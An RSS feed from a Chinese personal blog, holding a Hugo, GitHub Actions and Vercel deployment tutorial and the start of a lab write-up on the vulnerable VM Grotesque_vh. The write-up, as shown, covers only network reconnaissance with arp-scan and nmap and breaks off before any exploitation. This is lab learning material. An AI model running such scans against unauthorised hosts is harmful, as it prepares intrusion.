<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:webfeeds="http://webfeeds.org/rss/1.0"><channel><title>echo</title><link>https://www.inecho.cc/zh-cn/</link><description>Recent content on echo</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 31 Jan 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://www.inecho.cc/zh-cn/index.xml" rel="self" type="application/rss+xml"/><item><title>关于</title><link>https://www.inecho.cc/zh-cn/about/</link><pubDate>Sun, 20 Aug 2017 21:38:52 +0800</pubDate><guid>https://www.inecho.cc/zh-cn/about/</guid><description>&lt;p>本网站创建于2022年7月，农历壬寅年。&lt;/p></description></item><item><title>Hugo 博客搭建指南</title><link>https://www.inecho.cc/zh-cn/2024/01/31/hugo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</link><pubDate>Wed, 31 Jan 2024 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2024/01/31/hugo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</guid><description>&lt;p>最近在折腾静态博客，最初的选择是 Hexo ，但是 Hexo 要依赖于 Node.js 和大量的第三方组件，所以再三考虑下最终还是选择了 Hugo + GitHub Pages + Vercel 这个方案，以用来替换我部署在腾讯云服务器上的 WordPress 网站。在迁移的过程中，碍于个人水平有限，期间查阅了大量资料进行了诸多尝试才初获成功，因此在这里记录下整个过程以资备忘。&lt;/p>
&lt;p>搭建环境：Hugo、GitHub 系列产品、Vercel、Windows 10 。&lt;/p>
&lt;h2 id="一hugo-配置">一、Hugo 配置&lt;/h2>
&lt;p>首先去 &lt;a href="https://gohugo.io/">Hugo 官网&lt;/a> 或者直接进入 &lt;a href="https://github.com/gohugoio/hugo">Hugo GitHub 仓库&lt;/a> 下载 Hugo 。推荐下载 Hugo Extended 版本，关于 Hugo 不同版本的区别可在 &lt;a href="https://gohugo.io/installation/windows/#:~:text=Windows%20Server%202016.-,Editions,-Hugo%20is%20available">这里&lt;/a> 查看说明。另外安装配置过程也可参考 &lt;a href="https://hugo.opendocs.io/getting-started/">Hugo 中文文档&lt;/a> 该文档应该是由第三方翻译而成，算是 Hugo 的中文镜像站。&lt;/p>
&lt;p>解压后将包含这三个文件的文件夹直接放到自己的软件安装路径即可，不用双击 Hugo.exe 安装。&lt;/p>
&lt;p>&lt;img src="img/image-20240201172112965.png" alt="">&lt;/p>
&lt;p>将 Hugo.exe 添加到系统环境变量，此举的目的是使得 Hugo 可以在终端中运行。&lt;/p>
&lt;p>&lt;img src="img/image-20240201172910757.png" alt="">&lt;/p>
&lt;p>配置好系统环境变量后，打开终端输入 &lt;code>hugo version&lt;/code> 如果显示了对应的版本号则说明安装成功。&lt;/p>
&lt;p>&lt;img src="img/image-20240201173151779.png" alt="">&lt;/p>
&lt;p>现在我们可以使用 &lt;code>hugo new site myNewSite&lt;/code> 在当前目录下创建一个名为 myNewSite 的网站。Hugo 网站的目录结构请参阅 &lt;a href="https://hugo.opendocs.io/getting-started/directory-structure/">Hugo 中文文档/目录结构&lt;/a> 。&lt;/p>
&lt;p>&lt;img src="img/image-20240201173609947.png" alt="">&lt;/p>
&lt;p>因为 Hugo 是不自带主题的，所以需要先下载配置一款主题才能让刚才创建的 myNewSite 网站运行起来。主题可以在 &lt;a href="https://themes.gohugo.io/">Hugo 官方主题推荐&lt;/a> 或 &lt;a href="https://github.com/">GitHub&lt;/a> 中直接搜索 Hugo-theme 找到合适的。这里使用 &lt;a href="https://github.com/flysnow-org/maupassant-hugo">maupassant-hugo&lt;/a> 进行演示。&lt;/p>
&lt;p>由于网络环境问题，使用 &lt;a href="https://git-scm.com/">Git&lt;/a> 下载主题可能会失败。所以可直接从 GitHub 手动下载，下载成功后解压主题到 myNewSite 文件夹下的 themes 文件夹中。主题目录结构如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-tex" data-lang="tex">&lt;span class="line">&lt;span class="cl">└── themes 主题目录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> └── maupassant maupassant主题目录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── archetypes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── exampleSite 示例站点
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │   ├── content
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │   └── config.toml 默认配置信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── i18n
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── layouts 网站模版
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── static 静态目录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │   ├── css
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │   └── js
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── .gitignore
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── LICENSE.md
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── preview.png
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── README.md
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── README&lt;span class="nb">_&lt;/span>EN.md
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> └── theme.toml 主题配置文件
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里要重点说一下 exampleSite 文件夹，该文件夹是主题的示例站点，大部分主题都有这个文件夹。在这个文件夹中可以找到 config.toml 这个文件，该文件为默认配置好了的网站和主题配置文件。使用时，只需要进行简单的修改，然后将内容复制粘贴到网站根目录下的 hugo.toml 文件内即可。&lt;/p>
&lt;p>另外在不同主题使用教程中会告诉我们把 exampleSite 文件夹下的 config.toml 和其他文件或文件夹直接拖到网站根目录下即可生效，但是在新版的 Hugo 中这样做了之后是无法启动网站的。这是因为由旧版本 Hugo 所生成的网站根目录下 Hugo.toml 为 config.toml ，直接拖动 config.toml 可以覆盖网站自带的配置文件以生效，但是新版本的 Hugo 将 config.toml 改成了 Hugo.toml ，当网站根目录下同时存有 Hugo.toml 和 config.toml 时，运行网站只会从 Hugo.toml 中读取配置信息，当只有 config.toml 时才会读取 config.toml 。这里建议使用 Hugo.toml 为配置文件，更多信息可参阅 &lt;a href="https://hugo.opendocs.io/getting-started/configuration/">Hugo 中文文档/配置&lt;/a> 。&lt;/p>
&lt;p>下图中圈起来的 &lt;code>baseURL = &amp;quot;https://localhost:1313/&amp;quot;&lt;/code> 要注意，如果在本地配置完成后要部署到互联网上时要改成你自己的域名。在本地运行使用 &lt;code>localhost&lt;/code> 即可。其他的配置信息可根据自身需求更改，比如这里注释掉了广告模块。&lt;/p>
&lt;p>&lt;img src="img/image-20240202104717764.png" alt="">&lt;/p>
&lt;p>修改成功后，在网站根目录下执行 &lt;code>hugo server -D&lt;/code> 命令运行网站。&lt;/p>
&lt;p>&lt;img src="img/image-20240202105644798.png" alt="">&lt;/p>
&lt;p>打开浏览器访问 &lt;code>http://localhost:1313/&lt;/code> 如下图所示即配置成功。&lt;/p>
&lt;p>&lt;img src="img/image-20240202105917191.png" alt="">&lt;/p>
&lt;p>接下来我们要把搭建好的网站部署到 GitHub Pagess 发布。&lt;/p>
&lt;h2 id="二github-配置">二、GitHub 配置&lt;/h2>
&lt;p>关于 GitHub 的用法我们这里就不在赘述，重点说一下网站的发布流程。首先我们在本地创建或者修改网站内容后，使用 Git 或 GitHub Desktop 将网站内容上传到 GitHub 仓库中，然后借用 GitHub 提供的 &lt;a href="https://docs.github.com/zh/actions">GitHub Actions&lt;/a> 和 &lt;a href="https://docs.github.com/zh/pages">GitHub Pages&lt;/a> 这两项服务发布网站。&lt;/p>
&lt;p>所以我们要创建两个仓库，分别是 Private 和 Public 性质的仓库。Private 仓库，用来存放网站的建站资源文件，如配置文件、.md内容、主题文件等，该仓库将要存放的内容基本上和本地 myNewSite 文件夹中的文件一致，上传文件或修改文件到该仓库后自动触发 GitHub Actions 将网站配置文件自动编译好推送到 Public 仓库。Public 仓库，收到 Private 推送的内容后自动触发 GitHub Pages 服务发布网站。&lt;/p>
&lt;h3 id="1创建仓库">1.创建仓库&lt;/h3>
&lt;p>创建 Private 仓库，仓库的名称没有要求，这里我将其命名为 myNewSite 。&lt;/p>
&lt;p>&lt;img src="img/image-20240202143514030.png" alt="">&lt;/p>
&lt;p>创建 Public 仓库，仓库名称必须为 &lt;code>Github 用户名.github.io&lt;/code> 形式，比如我的 Github 用户名为 linkinecho 那么这个仓库名则为 linkinecho.github.io 。因为只有这样才能自动启用 &lt;a href="https://pages.github.com/">Github Pages&lt;/a> 发布网站。&lt;/p>
&lt;p>&lt;img src="img/image-20240202144617518.png" alt="">&lt;/p>
&lt;p>Public 仓库创建成功后，可以在仓库中新建一个 index.html 文件，随便写上一点内容，然后等待 Github Pages 自动构建完成后即可使用仓库名称作为域名访问一个简易的站点。&lt;/p>
&lt;p>&lt;img src="img/image-20240204175606514.png" alt="">&lt;/p>
&lt;h3 id="2配置-github-actions">2.配置 GitHub Actions&lt;/h3>
&lt;h4 id="21-创建-github-账户个人访问令牌">2.1 创建 GitHub 账户个人访问令牌&lt;/h4>
&lt;p>登录 Github，点击个人头像，选择 &lt;strong>Settings&lt;/strong>，进入个人设置页面，点击选择 &lt;strong>Developer settings&lt;/strong> 。&lt;/p>
&lt;p>&lt;img src="img/image-20240204191608269.png" alt="">&lt;/p>
&lt;p>然后如图依次点击 Personal access tokens &amp;mdash;&amp;gt; Tokens (classic) &amp;mdash;&amp;gt; Generate new token ，创建一个（经典）密钥。&lt;/p>
&lt;p>&lt;img src="img/image-20240204191852422.png" alt="">&lt;/p>
&lt;p>密钥名称任意，方便以后识别即可。重点是要勾选 workflow ，配置如下图所示。点击页面底部绿色 Generate token 按钮后即可生成。最后，切记！切记！一定要在令牌生成后将 &lt;strong>ghp_&lt;/strong> 开头的一串字符复制下来并保存在安全可靠的地方，不然之后是无法再看到该串字符的。&lt;/p>
&lt;p>&lt;img src="img/image-20240204192342613.png" alt="">&lt;/p>
&lt;h4 id="22-为私有仓库创建-actions-secrets">2.2 为私有仓库创建 Actions secrets&lt;/h4>
&lt;p>依次点击 Settings &amp;mdash;&amp;gt; Secrets and variables &amp;mdash;&amp;gt; Actions &amp;mdash;&amp;gt; New repository secrets 。&lt;/p>
&lt;p>&lt;img src="img/image-20240204203750003.png" alt="">&lt;/p>
&lt;p>分别输入名称和值，名称可以使用任意名，这里使用 HUGO_TOKEN_MYNEWSITE ，值则是我们之前创建的 ghp_ 开头的数值。&lt;/p>
&lt;p>&lt;img src="img/image-20240204204321966.png" alt="">&lt;/p>
&lt;p>填写好后，点击 Add secrets 即可添加成功。&lt;/p>
&lt;p>&lt;img src="img/image-20240204204610484.png" alt="">&lt;/p>
&lt;h3 id="3安装-github-desktop">3.安装 GitHub Desktop&lt;/h3>
&lt;p>两个 GitHub 仓库和 GitHub Actions 配置成功后，下一步要在本地安装 &lt;a href="https://git-scm.com/">Git&lt;/a> 或 &lt;a href="https://desktop.github.com/">GitHub Desktop&lt;/a> 软件，这两款软件的作用是将我们存储在本地的 myNewSite 文件夹上传到 GitHub_Private_myNewSite 仓库。这里选择安装 GtiHub Desktop 这款软件。安装成功后点击 Sign in to Github.com 登录 GitHub 账户。软件的安装和配置可自行 Google ，基本上一路默认即可。&lt;/p>
&lt;p>&lt;img src="img/image-20240204181111996.png" alt="">&lt;/p>
&lt;p>登录成功后，我们选择将 myNewSite 仓库克隆到本地。克隆到本地的任意路径都可以，但是克隆到的路径不能有同名文件夹。&lt;/p>
&lt;p>&lt;img src="" alt="">img/image-20240204182208153.png&lt;/p>
&lt;p>&lt;img src="img/image-20240204182323464.png" alt="">&lt;/p>
&lt;p>克隆成功后本地会出现一个和仓库同名的文件夹，此时该文件夹内仅有 .git 隐藏文件夹（该文件夹是 GitHub Desktop 生成的配置文件，不可删除），我们将之前创建好的 Hugo 网站 myNewSite 中的所有文件都复制粘贴到这里面来，复制好之后旧的 myNewSite 文件夹就可以删除了。&lt;/p>
&lt;p>然后，我们需要在本地创建 Actions 。在新的 myNewSite 文件夹根目录下创建 .github\workflows\main.yml 文件夹和文件，该文件是 GitHub Actions 中定义工作流程的配置文件。在这个文件中包含了一系列的步骤（steps），每个步骤定义了一个任务，例如构建代码、运行测试、部署应用程序等。这些步骤会在配置的触发事件（例如代码推送或Pull Request）发生时按顺序执行。创建好后在该文件中输入以下内容：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub Pages&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">push&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">branches&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">main &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 博客根目录的默认分支，这里是main，有时也是master&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">pull_request&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">jobs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">deploy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">runs-on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ubuntu-latest&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">concurrency&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">group&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">${{ github.workflow }}-${{ github.ref }}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">steps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">actions/checkout@v2&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">submodules&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">fetch-depth&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">0&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Setup Hugo&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">peaceiris/actions-hugo@v2&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">hugo-version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;0.121.2&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 填写你的hugo版本，可用hugo version查看&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">extended&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 如果你使用的不是extended版本的hugo，将true改为false&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Build&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">run&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">hugo --minify&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Deploy&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">peaceiris/actions-gh-pages@v3&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">if&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">${{ github.ref == &amp;#39;refs/heads/main&amp;#39; }} &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 注意填写main或者master&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">personal_token&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">${{ secrets.HUGO_TOKEN_MYNEWSITE}}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 如果secret取了其他名称，将HUGO_TOKEN_MYNEWSITE替换掉&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">external_repository&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">linkinecho/linkinecho.github.io&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 填写远程仓库，不一定是这个格式，按照自己的情况写 &lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_dir&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">./public&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c">#cname: www.example.com # 填写你的自定义域名。如果没有用自定义域名，注释掉这行&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="三发布网站">三、发布网站&lt;/h2>
&lt;h3 id="1使用-github-pages-发布">1.使用 GitHub pages 发布&lt;/h3>
&lt;p>一切准备就绪后，本地等待上传的内容应该如下图所示。&lt;/p>
&lt;p>&lt;img src="img/image-20240204210953548.png" alt="">&lt;/p>
&lt;p>打开 GitHub Desktop 点击 &lt;strong>Commit to main&lt;/strong> 按钮提交所有修改，然后点击 &lt;strong>Push origin&lt;/strong> 按钮将修改内容推送到 Github 网站的 myWebSite 仓库，随后触发 Github Actions 自动执行编译、发布功能。&lt;/p>
&lt;p>&lt;img src="img/image-20240204211358996.png" alt="">&lt;/p>
&lt;p>待成功后会将生成的网站内容推送到之前创建的公有仓库 &lt;code>linkinecho.github.io&lt;/code> 的 &lt;strong>gh_pages&lt;/strong> 分支，需要修改公有仓库的 Pages 设置，将发布分支由 &lt;strong>main&lt;/strong> 更换为 &lt;strong>gh_pages&lt;/strong> 。&lt;/p>
&lt;p>&lt;img src="img/image-20240204211822363.png" alt="">&lt;/p>
&lt;p>稍等片刻，使用浏览器访问 &lt;a href="https://linkinecho.github.io/">https://linkinecho.github.io/&lt;/a> ，即可访问我们的网站。&lt;/p>
&lt;p>&lt;img src="img/image-20240204212046943.png" alt="">&lt;/p>
&lt;p>最后还可以在该仓库的 setting 中修改默认分支为 gh-pages 。&lt;/p>
&lt;p>&lt;img src="img/image-20240204214850084.png" alt="">&lt;/p>
&lt;h3 id="2使用-vercel-托管发布">2.使用 Vercel 托管发布&lt;/h3>
&lt;p>&lt;a href="https://vercel.com/">Vercel&lt;/a> 是一个免费的网站托管平台，也是我目前用过最好的网站托管平台，不仅仅可以部署静态网站，而且还可以部署动态网站，所以我们可以拿 vercel 充当你免费的服务器。它的作用和 GitHub Pages 类似，但是直接使用 GitHub Pages 访问网站会受网络环境因素的干扰导致访问速度很不稳定，而部署在 Vercel 后的访问速度还是很快的。另外如果你有自己的域名，Vercel 还可以给你的域名免费提供 HTTPS 证书。&lt;/p>
&lt;p>在 &lt;a href="https://vercel.com/">Vercel 官网&lt;/a> 注册一个用户，点击右上角 Sign up 填写基本信息。&lt;/p>
&lt;p>&lt;img src="img/image-20240204213502779.png" alt="">&lt;/p>
&lt;p>下一步，绑定 GitHub 账户。&lt;/p>
&lt;p>&lt;img src="img/image-20240204213617835.png" alt="">&lt;/p>
&lt;p>注册绑定成功后，会自动调转到配置页面，此时点击 install 在 GitHub 账户中安装 Vercel，实际上是授予 Vercel 对 GitHub 账户及所属仓库的访问权限。&lt;/p>
&lt;p>&lt;img src="img/image-20240204213823040.png" alt="">&lt;/p>
&lt;p>安装成功后，在 Vercel 中会显示你的仓库，我们使用的是目标代码托管的方式，因此这里选择 linksinecho.github.io 这个仓库，点击 import 。&lt;/p>
&lt;p>&lt;img src="img/image-20240204214213623.png" alt="">&lt;/p>
&lt;p>FRAMEWORK PRESET 选 Other (因为目标文件是没有框架的)，点击 Deploy 。需要注意的是，图中蓝色横线标注的位置，如果之前没有修改仓库的默认分支，那么此处会是 main 分支，需要在 GitHub 相应的仓库中修改默认分支为存储发布网站的分支。&lt;/p>
&lt;p>&lt;img src="img/image-20240204215100215.png" alt="">&lt;/p>
&lt;p>托管成功。&lt;/p>
&lt;p>&lt;img src="img/image-20240204215522357.png" alt="">&lt;/p>
&lt;p>最后，需要在该项目的 setting 中修改 Git 的默认分支为 gh-pages 。此举的目的是，让 Vercel 自动拉取 GitHub 仓库中的修改。&lt;/p>
&lt;p>&lt;img src="img/image-20240204220202357.png" alt="">&lt;/p>
&lt;p>验证。在 &lt;strong>myWebSite&lt;/strong> 文件夹执行 &lt;code>hugo new posts/演示.md&lt;/code> 命令，将新生成的 &lt;strong>演示.md&lt;/strong> 文件中的 &lt;strong>draft&lt;/strong> 的值由 &lt;strong>true&lt;/strong> 改为 &lt;strong>false&lt;/strong> （该值是指是否为草稿，如果是草稿则不会发布），随便贴些内容后，使用 Github Desktop 提交并推送，稍微等待 Actions 执行完毕，访问 Vercel 给的域名，即可看到网站已经更新。&lt;/p>
&lt;p>&lt;img src="img/image-20240204221331777.png" alt="">&lt;/p>
&lt;h2 id="四绑定域名">四、绑定域名&lt;/h2>
&lt;p>GitHub pages 和 Vercel 提供的域名未免太长了，因此我们可以从腾讯云或阿里云等域名服务商购买合适的域名绑定网站。关于域名的购买不再赘述，Google 一搜索一堆教程，要注意的是域名的续费价格，有的域名初次购买很便宜但是续费价格却非常贵。&lt;/p>
&lt;p>域名购买成功后，先不要在域名服务商处做 DNS 解析指向 Github pages 或 Vercel 给的域名。先在 Vercel 托管项目中的 setting 中的 Domains 添加域名。&lt;/p>
&lt;p>&lt;img src="img/image-20240204224512748.png" alt="">&lt;/p>
&lt;p>选择第一个。&lt;/p>
&lt;p>&lt;img src="img/image-20240204224634556.png" alt="">&lt;/p>
&lt;p>添加成功后会提示无效的配置，这是因为 Vercel 没有检测到有效的 DNS 解析。&lt;/p>
&lt;p>&lt;img src="img/image-20240204224937365.png" alt="">&lt;/p>
&lt;p>使用上图中框起来的解析推荐，在域名服务商中设置 DNS 解析到如下 IP 和网址。&lt;/p>
&lt;p>&lt;img src="img/image-20240204225146878.png" alt="">&lt;/p>
&lt;p>添加解析记录成功后，需要等待一段的时间才可使 DNS 解析记录传送至全球 DNS 服务器中。此后，就可以使用自己的域名访问网站了。&lt;/p></description></item><item><title>靶机：Grotesque_vh 1.0.1</title><link>https://www.inecho.cc/zh-cn/2023/10/06/%E9%9D%B6%E6%9C%BAgrotesque_vh-1.0.1/</link><pubDate>Fri, 06 Oct 2023 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2023/10/06/%E9%9D%B6%E6%9C%BAgrotesque_vh-1.0.1/</guid><description>&lt;h3 id="一信息收集">一、信息收集&lt;/h3>
&lt;h4 id="1-使用-arp-scan-找到靶机">1 使用 arp-scan 找到靶机&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">arp-scan --interface eth0 10.9.23.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>┌──(root㉿kali)-[~]
└─# arp-scan --interface eth0 10.9.23.0/24
Interface: eth0, type: EN10MB, MAC: 00:0c:29:0a:50:19, IPv4: 10.9.23.111
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.9.23.1 50:6f:77:89:ad:99 HUAWEI TECHNOLOGIES CO.,LTD
10.9.23.10 68:da:73:a9:5c:57 (Unknown)
……
10.9.23.155 08:00:27:9c:83:dc PCS Systemtechnik GmbH
……
10.9.23.233 7c:57:58:67:3c:15 HP Inc.
10.9.23.235 90:2e:16:a8:b9:1c LCFC(HeFei) Electronics Technology co., ltd
10.9.23.238 00:2b:67:39:76:66 LCFC(HeFei) Electronics Technology co., ltd
35 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.052 seconds (124.76 hosts/sec). 34 responded
&lt;/code>&lt;/pre>&lt;p>找到靶机：10.9.23.155 08:00:27:9c:83:dc &lt;strong>PCS Systemtechnik GmbH&lt;/strong>&lt;/p>
&lt;h4 id="2-使用-nmap-对其进行详细扫描">2 使用 nmap 对其进行详细扫描&lt;/h4>
&lt;pre tabindex="0">&lt;code>┌──(root㉿kali)-[~]
└─# nmap -A -sV -p- 10.9.23.155
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 19:52 CST
Nmap scan report for localhost (10.9.23.155)
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE VERSION
66/tcp open http WEBrick httpd 1.4.2 (Ruby 2.5.5 (2019-03-15))
